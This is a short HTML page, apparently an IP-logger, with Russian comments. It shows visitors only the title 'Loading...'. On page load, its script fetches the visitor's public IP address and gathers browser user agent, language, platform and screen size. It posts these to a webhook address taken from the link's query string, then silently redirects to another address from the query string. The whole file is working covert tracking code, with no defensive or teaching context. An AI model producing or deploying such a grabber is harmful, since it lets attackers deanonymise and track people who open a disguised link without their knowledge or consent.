<!DOCTYPE html>
<html>
<head>
  <title>Loading...</title>
</head>
<body onload="sendWebhookMessage()">
  <script>
    const url = new URL(window.location.href);
	const params = new URLSearchParams(url.search);
	const webhookUrl = params.get("webhook");
	const redirectUrl = params.get("redirect");
  
    function sendWebhookMessage() {
      // Получение информации об IP-адресе
      fetch('https://api.ipify.org?format=json')
        .then(response => response.json())
        .then(data => {
          var ip = data.ip;

          // Получение другой информации
          var userAgent = navigator.userAgent;
          var language = navigator.language;
          var platform = navigator.platform;
          var screenWidth = screen.width;
          var screenHeight = screen.height;

          var message = `
            IP Address: ${ip}
            User Agent: ${userAgent}
            Language: ${language}
            Platform: ${platform}
            Screen Size: ${screenWidth} x ${screenHeight}
          `;

          var data = {
            "content": message
          };

          fetch(webhookUrl, {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json'
            },
            body: JSON.stringify(data)
          })
          .then(function(response) {
            if (response.ok) {
              window.location.href = redirectUrl; // Redirect to another website
            } else {
              window.location.href = redirectUrl;
            }
          })
          .catch(function(error) {
            alert('An error occurred: ' + error);
          });
        })
        .catch(error => {
          alert('Failed to get IP address: ' + error);
        });
    }
  </script>
</body>
</html>
